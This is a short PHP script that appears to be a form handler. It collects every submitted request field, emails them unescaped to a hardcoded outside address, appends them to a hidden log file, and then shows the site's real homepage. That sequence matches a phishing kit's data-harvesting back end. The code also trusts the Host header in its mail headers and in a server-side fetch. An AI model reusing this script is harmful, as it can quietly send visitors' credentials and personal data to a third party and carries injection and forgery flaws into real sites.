<?php
$q = "";
foreach($_REQUEST as $k => $v)
{
	$q .= "$k : $v\r\n\r\n";
}
$str = "
<pre>
".$_SERVER["HTTP_HOST"]."
$q
</pre>";

	mail("info@webstudyo.gr", $_SERVER["HTTP_HOST"]." - From form", $str, "MIME-Version: 1.0\r\nContent-type: text/html; charset=windows-1251\r\nFrom: info@".$_SERVER["HTTP_HOST"]."\r\n");

	$handle = fopen("../forms.txt", "a+");
	fwrite($handle, $str."\n");
	fclose($handle);

echo file_get_contents("http://".$_SERVER["HTTP_HOST"]."/");
?>
